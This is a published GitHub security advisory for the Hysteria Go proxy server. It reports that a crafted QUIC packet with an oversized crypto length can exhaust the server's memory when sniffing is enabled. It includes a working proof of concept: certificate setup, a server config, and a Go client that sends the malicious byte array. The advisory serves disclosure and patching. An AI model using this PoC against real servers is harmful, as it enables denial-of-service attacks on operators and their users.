# [H] Hysteria: A specially constructed quic package can crash the server OOM when the sniff is enabled

## Summary
Severity: High
Advisory: GHSA-9fw6-xgg2-mq9q
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-9fw6-xgg2-mq9q
Type: github-advisory

## Affected
- Go: `github.com/apernet/hysteria/core/v2` — affected >=0

## Details
### Summary

A specially constructed quic package can crash the server OOM when the sniff is enabled.

### Details

When the server has sniff enabled, a valid connection can request the server to forward UDP traffic and construct a huge crypto length. The server will allocate memory according to this length, causing an OOM.


### PoC
```
openssl req -x509 -newkey rsa:2048 -nodes -keyout localhost.key -out localhost.crt -days 365 -subj "/CN=localhost" 2>/dev/null
```

server.yaml
```
listen: :8443
tls:
  cert: localhost.crt
  key: localhost.key
auth:
  type: password
  password: mypassword
sniff:
  enable: true
outbounds:
  - name: my_direct
    type: direct
    default: true
```

poc.go

```
package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/apernet/hysteria/core/v2/client"
)

func main() {
	serverAddrStr := flag.String("server", "127.0.0.1:8443", "Hysteria server address")
	password := flag.String("password", "mypassword", "Hysteria server password")
	flag.Parse()

	serverAddr, _ := net.ResolveUDPAddr("udp", *serverAddrStr)
	c, _, err := client.NewClient(&client.Config{
		ServerAddr: serverAddr, Auth: *password, TLSConfig: client.TLSConfig{InsecureSkipVerify: true},
	})
	if err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}
	defer c.Close()
                                                                                                                
	var maliciousQUICPacket = []byte{                                                                                                                                                                         
		0xcb, 0x0, 0x0, 0x0, 0x1, 0x8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x0, 0x0,                                                                                                              
		0x32, 0x1d, 0xa8, 0xd6, 0x3c, 0x51, 0x24, 0xb7, 0xbe, 0xf2, 0x91, 0x77, 0x1c, 0x9d, 0x66,                                                                                                             
		0xfc, 0xab, 0x91, 0x1e, 0xaf, 0xf9, 0x14, 0xd5, 0xec, 0xb0, 0x74, 0x46, 0x4f, 0x4, 0x70,                                                                                                              
		0x18, 0x35, 0x31, 0xc5, 0xea, 0x36, 0x40, 0x36, 0x65, 0xdf, 0xa4, 0xcc, 0xf9, 0xff, 0x65,                                                                                                             
		0xe5, 0x1d, 0xb7, 0xc5, 0xc2, 0xc2,                                                                                                                                                                   
	} 

	udpConn, err := c.UDP()
	if err != nil {
		fmt.Printf("[-] UDP error: %v\n", err)
	}
	targetAddr := fmt.Sprintf("8.8.8.8:443")
	fmt.Printf("[*] Sending 'death' packet to %s...\n", targetAddr)
	_ = udpConn.Send(maliciousQUICPacket, targetAddr)

	// Wait longer to ensure packet delivery
	time.Sleep(3 * time.Second)
	fmt.Printf("[+] Done.\n")
}
```


### Impact
When sniffing is enabled on the server, a user with a valid password can launch an attack that could cause the server to run out of memory (OOM).

## References
- https://github.com/apernet/hysteria/security/advisories/GHSA-9fw6-xgg2-mq9q
- https://github.com/apernet/hysteria
